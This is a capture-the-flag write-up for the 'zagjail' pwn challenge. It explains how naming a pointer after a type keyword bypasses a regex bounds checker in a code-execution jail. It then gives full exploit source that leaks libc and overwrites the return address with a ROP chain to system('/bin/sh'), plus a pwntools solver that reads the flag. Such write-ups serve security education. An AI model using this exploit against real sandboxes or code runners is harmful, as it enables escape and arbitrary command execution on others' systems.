# zagjail — CTF Writeup

**Category:** Pwn
**Flag:** `gigem{custom_language_but_still_links_to_libc_:thinking:_jk_thanks_for_the_cool_language}`

---

## Overview

We're given a jail that compiles and runs code written in [Zag](https://github.com/macsencasaus/zag), a custom compiled language. Before compiling, a Python script (`server.py`) validates the submitted source to block dangerous operations:

- `extern` keyword (would allow calling arbitrary C functions)
- Pointer arithmetic (`p + N`, `p - N`)
- Out-of-bounds subscript accesses

If the code passes validation, it's compiled with the `zag` binary and executed via `os.execv`. The flag is at `/app/flag.txt`.

---

## Understanding the Checker

`server.py` implements a regex-based tokenizer that tracks pointer state. Key data structures:

```python
TYPE_SIZES = {
    'i8': 1, 'u8': 1, 'i16': 2, 'u16': 2,
    'i32': 4, 'u32': 4, 'i64': 8, 'u64': 8,
    'f32': 4, 'f64': 8,
}

ptrs: dict[str, PtrState] = {}  # tracks declared pointers
```

For every pointer dereference (`*name`), the checker calls `bounds_check()` — unless it hits this branch:

```python
elif k == 'DEREF':
    name = _re['DEREF'].search(txt).group(1)
    if name in TYPE_SIZES:
        pass  # type annotation (*u32 etc.), not a dereference  ← BYPASS
    elif name in ptrs:
        bounds_check(name, 0, f"'*{name}'")
    else:
        die(f"Rejected: dereference of untracked pointer '{name}'.")
```

The intent is to skip over type annotations like `*u32` appearing in declarations. But the check is purely on the variable **name** — if the pointer variable itself is named `u64` (or any other entry in `TYPE_SIZES`), every dereference of it is silently skipped, even when the pointer is miles out of bounds.

---

## The Vulnerability

**If you name a pointer variable after a type (e.g., `u64`, `u8`), the bounds checker is completely bypassed for every read/write through that pointer.**

```zag
var arr: [32]u64;
var u64: *u64 = &arr[0];   // name 'u64' is in TYPE_SIZES
```

The checker registers `u64` in `ptrs` normally (so it tracks its index), but whenever the tokenizer sees `*u64`, it takes the `if name in TYPE_SIZES: pass` branch — no bounds check, no taint check, nothing.

Additionally, Zag's `p++` increments a pointer by **1 byte** regardless of the element type (the QBE backend emits `add ptr %p, ptr 1`). This means we can advance byte-by-byte to any stack location.

---

## Stack Layout

For a function with `var arr: [32]u64`:

```
arr[0]          ← rbp - 256  (our read/write primitive starts here)
...
arr[31]         ← rbp - 8
saved RBP       ← rbp + 0    (+256 bytes from arr[0])
return address  ← rbp + 8    (+264 bytes from arr[0])
```

The return address points back into `__libc_start_call_main` in libc (offset `0x29ca8`), giving us a libc leak.

---

## Exploit Plan

1. **Advance past the array**: Loop 256 times doing `u64++` (1 byte each) to reach the saved RBP slot, then 8 more to land on the return address.
2. **Leak libc base**: Read `*u64` — this is the return address into libc. Subtract offset `0x29ca8` to get `libc_base`.
3. **Build ROP chain**: Using known libc offsets, compute addresses for a `ret2libc` chain.
4. **Overwrite return address**: Write the ROP chain in place of the return address.
5. **Trigger**: `return 0;` pops the forged return address and executes the chain.

**ROP chain** (uses `/bin/sh` already present in libc — no need to know the stack address of our buffer):

```
pop rdi; ret      ← libc + 0x2a145
&"/bin/sh"        ← libc + 0x1a5ea4
ret               ← libc + 0x2a146   (stack alignment)
system()          ← libc + 0x53110
```

---

## Exploit Source (Zag)

```zag
fn main() i32 {
    var arr: [32]u64;
    var u64: *u64 = &arr[0];   // DEREF bypass: 'u64' in TYPE_SIZES
    var i: i32 = 0;

    // Advance 256 bytes to saved RBP slot
    while i < 256 {
        u64++;
        i = i + 1;
    }

    // Advance 8 more bytes to return address
    i = 0;
    while i < 8 {
        u64++;
        i = i + 1;
    }

    // Leak libc base from return address
    var libc_ret: u64 = *u64;
    var libc_base: u64 = libc_ret - 171176;    // 0x29ca8

    // Compute ROP gadget addresses
    var pop_rdi: u64 = libc_base + 172357;     // 0x2a145  pop rdi; ret
    var binsh_addr: u64 = libc_base + 1728164; // 0x1a5ea4 "/bin/sh"
    var ret_gadget: u64 = libc_base + 172358;  // 0x2a146  ret (alignment)
    var system_addr: u64 = libc_base + 340240; // 0x53110  system()

    // Write ROP chain over return address
    *u64 = pop_rdi;
    i = 0;
    while i < 8 { u64++; i = i + 1; }

    *u64 = binsh_addr;
    i = 0;
    while i < 8 { u64++; i = i + 1; }

    *u64 = ret_gadget;
    i = 0;
    while i < 8 { u64++; i = i + 1; }

    *u64 = system_addr;

    return 0;   // triggers ROP → system("/bin/sh")
}
```

---

## Solver Script

```python
from pwn import *
import time

io = remote("streams.tamuctf.com", 443, ssl=True, sni="zagjail")

exploit_src = open("exploit.zag").read()

io.recvuntil(b"\n===\n")   # consume full banner

for line in exploit_src.rstrip('\n').split('\n'):
    io.sendline(line.encode())
io.sendline(b"<EOF>")

io.recvline(timeout=15)   # "Compiling..."
io.recvline(timeout=15)   # "Running..."

time.sleep(0.5)
io.sendline(b"cat /app/flag.txt")
time.sleep(2)
print(io.recv(timeout=5).decode())
io.close()
```

---

## Key Takeaways

- **Regex-based security checkers are fragile.** The checker conflated the *name* of a variable with a *type keyword*, creating a complete bypass for any pointer named after a built-in type.
- **Zag pointer increment is byte-granular.** `p++` always adds 1 byte, making it easy to navigate the stack without the blocked `p + N` arithmetic.
- **No `extern` needed.** Full RCE was achieved purely within Zag's type system by leveraging libc gadgets already mapped into the process.
